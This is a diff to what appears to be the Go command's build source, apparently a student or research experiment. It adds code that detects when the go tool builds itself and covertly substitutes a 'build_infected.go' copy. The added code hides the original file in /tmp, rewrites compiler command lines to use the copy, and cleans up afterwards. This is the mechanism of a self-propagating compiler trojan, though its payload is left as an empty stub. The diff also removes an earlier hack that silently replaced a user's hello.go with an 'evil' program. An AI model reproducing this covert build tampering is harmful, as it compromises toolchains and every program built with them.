@@ -434,24 +434,6 @@ func buildModeInit() {
 }
 
 func runBuild(cmd *Command, args []string) {
-  // hello
-  fmt.Println("HELLO")
-  fmt.Println(args)
-
-  // try this
-  filename := args[0]
-  if strings.Contains(filename, "hello.go") {
-    // hello
-    f, err := os.Create("main2.go")
-    args[0] = "main2.go"
-    if err != nil {
-      panic(err)
-    }
-
-    defer f.Close()
-    f.WriteString("package main\n\nimport \"fmt\"\n\nfunc main() {\n  fmt.Printf(\"evil\\n\")\n}")
-  }
-
 	instrumentInit()
 	buildModeInit()
 	var b builder
@@ -459,8 +441,8 @@ func runBuild(cmd *Command, args []string) {
 
 	pkgs := packagesForBuild(args)
 
-  fmt.Println("buildO set to:")
-  fmt.Println(*buildO)
+	// fmt.Println("buildO set to:")
+	// fmt.Println(*buildO)
 	if len(pkgs) == 1 && pkgs[0].Name == "main" && *buildO == "" {
 		_, *buildO = path.Split(pkgs[0].ImportPath)
 		*buildO += exeSuffix
@@ -481,6 +463,33 @@ func runBuild(cmd *Command, args []string) {
 		}
 	}
 
+	// begin rachit code
+	var isCompiler int = 0
+	var gocmdpath string = ""
+
+	for j := 0; j < len(pkgs); j++ {
+		a := pkgs[j]
+		gocmdpath = strings.Replace(a.Dir, "/dist", "/go", -1)
+		// gocmdpath = a.ImportPath
+		for i := 0; i < len(a.allgofiles); i++ {
+			b := a.allgofiles[i]
+			if strings.Contains(b, "buildgo.go") || strings.Contains(b, "buildruntime.go") || strings.Contains(b, "build.go") || strings.Contains(b, "main.go") {
+				isCompiler += 1
+			}
+			if strings.Contains(b, "build.go") {
+				pkgs[j].allgofiles[i] = strings.Replace(pkgs[j].allgofiles[i], "build.go", "build_infected.go", -1)
+			}
+		}
+		fmt.Println(pkgs[j].allgofiles)
+	}
+
+	if isCompiler == 4 {
+		createSabotageContents(gocmdpath+"/build.go", gocmdpath+"/build_infected.go")
+	}
+
+	pkgs = packagesForBuild(args)
+	// end rachit code
+
 	depMode := modeBuild
 	if buildI {
 		depMode = modeInstall
@@ -494,10 +503,6 @@ func runBuild(cmd *Command, args []string) {
 		}
 		p := pkgs[0]
 		p.target = *buildO
-    // evil
-    if strings.Contains(filename, "hello.go") {
-      p.target = "hello"
-    }
 		p.Stale = true // must build - not up to date
 		a := b.action(modeInstall, depMode, p)
 		b.do(a)
@@ -514,7 +519,69 @@ func runBuild(cmd *Command, args []string) {
 		}
 	}
 	b.do(a)
+
+	// begin rachit code
+	if isCompiler == 4 {
+		cleanUpSabotage(gocmdpath, "build_infected.go")
+	}
 }
+
+func cleanUpSabotage(dir string, f string) {
+	err := os.Remove(dir + "/" + f)
+	if err != nil {
+		fmt.Println("CLEANUP FAILED")
+	}
+
+	// move build.go from /tmp to dir
+	os.Rename("/tmp/build.go", dir+"/"+"build.go")
+}
+
+func createSabotageContents(src string, dst string) {
+	fmt.Println("creating: " + dst + " with contents from " + src)
+	// basically, create the deadly build.go file by copying the original contents
+	// and then editing it
+	in, err := os.Open(src)
+
+	if err != nil {
+		return
+	}
+	out, err := os.Create(dst)
+	if err != nil {
+		return
+	}
+	defer out.Close()
+
+	// let's read the input into a buffer of size 2x the file size
+	fi, err := in.Stat()
+	if err != nil {
+		return
+	}
+
+	var buf = make([]byte, fi.Size())
+	io.ReadFull(in, buf)
+	in.Close()
+
+	// move it to /tmp
+	err = os.Rename(src, "/tmp/build.go")
+	if err != nil {
+		return
+	}
+
+	files, _ := ioutil.ReadDir("./")
+	for _, f := range files {
+		fmt.Println(f.Name())
+	}
+
+	stringbuf := string(buf)
+
+	// now we just modify stringbuf
+	// do stuff here
+
+	out.WriteString(stringbuf)
+	return
+}
+
+// end rachit code
 
 var cmdInstall = &Command{
 	UsageLine: "install [build flags] [packages]",
@@ -1347,8 +1414,6 @@ func (b *builder) build(a *action) (err error) {
 	var gofiles, cgofiles, cfiles, sfiles, cxxfiles, objects, cgoObjects, pcCFLAGS, pcLDFLAGS []string
 
 	gofiles = append(gofiles, a.p.GoFiles...)
-  fmt.Println("HELLO gofiles")
-  fmt.Println(gofiles)
 	cgofiles = append(cgofiles, a.p.CgoFiles...)
 	cfiles = append(cfiles, a.p.CFiles...)
 	sfiles = append(sfiles, a.p.SFiles...)
@@ -1416,8 +1481,8 @@ func (b *builder) build(a *action) (err error) {
 	}
 
 	// If we're doing coverage, preprocess the .go files and put them in the work directory
-  //fmt.Println("printing a.p struct")
-  //fmt.Printf("%+v\n", a.p)
+	//fmt.Println("printing a.p struct")
+	//fmt.Printf("%+v\n", a.p)
 	if a.p.coverMode != "" {
 		for i, file := range gofiles {
 			var sourceFile string
@@ -1959,6 +2024,17 @@ func (b *builder) processOutput(out []byte) string {
 // It returns the command output and any errors that occurred.
 func (b *builder) runOut(dir string, desc string, env []string, cmdargs ...interface{}) ([]byte, error) {
 	cmdline := stringList(cmdargs...)
+	fmt.Println("CMDLINE:")
+	fmt.Println(cmdline)
+	fmt.Println("END CMDLINE")
+
+	// let's remove build.go and add build.infected.go
+	for i := 0; i < len(cmdline); i++ {
+		if strings.Contains(cmdline[i], "build.go") {
+			cmdline[i] = strings.Replace(cmdline[i], "build.go", "build_infected.go", -1)
+		}
+	}
+
 	if buildN || buildX {
 		var envcmdline string
 		for i := range env {
@@ -2230,8 +2306,8 @@ func (gcToolchain) gc(b *builder, p *Package, archive, obj string, asmhdr bool, 
 		}
 	}
 
-  //fmt.Println("tool compile")
-  //fmt.Println(tool("compile"))
+	//fmt.Println("tool compile")
+	//fmt.Println(tool("compile"))
 	args := []interface{}{buildToolExec, tool("compile"), "-o", ofile, "-trimpath", b.work, buildGcflags, gcargs, "-D", p.localPrefix, importArgs}
 	if ofile == archive {
 		args = append(args, "-pack")
@@ -2243,8 +2319,8 @@ func (gcToolchain) gc(b *builder, p *Package, archive, obj string, asmhdr bool, 
 		args = append(args, mkAbs(p.Dir, f))
 	}
 
-  //fmt.Println("compile args")
-  //fmt.Println(args)
+	//fmt.Println("compile args")
+	//fmt.Println(args)
 	output, err = b.runOut(p.Dir, p.ImportPath, nil, args...)
 	return ofile, output, err
 }
